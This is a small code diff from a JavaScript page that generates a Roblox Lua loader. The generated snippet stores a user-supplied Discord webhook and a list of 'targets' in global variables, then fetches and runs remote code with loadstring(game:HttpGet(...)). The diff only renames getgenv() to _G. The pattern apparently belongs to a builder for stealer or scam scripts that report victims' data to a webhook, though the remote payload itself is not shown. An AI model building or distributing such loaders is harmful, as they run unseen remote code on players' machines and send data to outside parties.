@@ -443,7 +443,7 @@ function generate(e) {
     if (!hook.startsWith("https://discord.com")) return toast("Invalid webhook", false);
     if (!targets)                                return toast("Add targets", false);
 
-    const code = `getgenv().Id=${id}\ngetgenv().Webhook="${hook}"\ngetgenv().Target=${formatTargets(targets)}\nloadstring(game:HttpGet("${MAIN}"))()`;
+    const code = `_G.Id=${id}\n_G.Webhook="${hook}"\n_G.Target=${formatTargets(targets)}\nloadstring(game:HttpGet("${MAIN}"))()`;
 
     const out = document.getElementById("out");
     const box = document.getElementById("outputBox");
